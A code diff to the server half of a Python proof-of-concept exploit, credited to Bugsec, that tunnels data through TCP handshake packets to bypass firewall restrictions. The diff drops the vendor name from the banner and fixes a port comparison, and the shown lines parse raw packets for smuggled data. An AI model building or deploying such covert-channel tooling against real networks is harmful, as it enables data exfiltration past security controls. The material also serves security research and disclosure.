@@ -1,5 +1,5 @@
 ####################################################################################################################
-# Palo Alto PoC exploit for data transfer over TCP handshake mechanism (Bypassing Firewall Restrictions)           #
+# PoC exploit for data transfer over TCP handshake mechanism (Bypassing Firewall Restrictions)                     #
 # The exploit implemented with client and server scripts, this is the SERVER.                                      #
 # This tool is for learning porpuses only, The authors doesn't responsible for any damage caused by using this tool#
 # Discovoerd by Stas Volfus(Bugsec)                                                                                #
@@ -12,7 +12,7 @@ from struct import *
 
 def Main(argv):
 	print "########################################################################################################"
-	print "#Palo Alto PoC exploit for data transfer over TCP handshake mechanism (Bypassing Firewall Restrictions)#"
+	print "#PoC exploit for data transfer over TCP handshake mechanism (Bypassing Firewall Restrictions)          #"
 	print "#The exploit implemented with client and server scripts, this is the SERVER.                           #"
 	print "#The authors doesn't responsible for any damage caused by using this tool                              #"
 	print "#Discovered By: Stas Volfus                                                                            #"
@@ -53,7 +53,7 @@ def Main(argv):
 	    h_size = iph_length + tcph_length * 4
 	    data_size = len(packet) - h_size
 	    #we got something..
-	    if dest_port is clientsDestPort and data_size > 0:
+	    if dest_port==clientsDestPort and data_size > 0:
 	    	print "[*] Received packet from " + str(s_addr) + " on port : " + str(dest_port) 
 		print "[*] Looking for data.." 
 	    	data = packet[h_size:] 
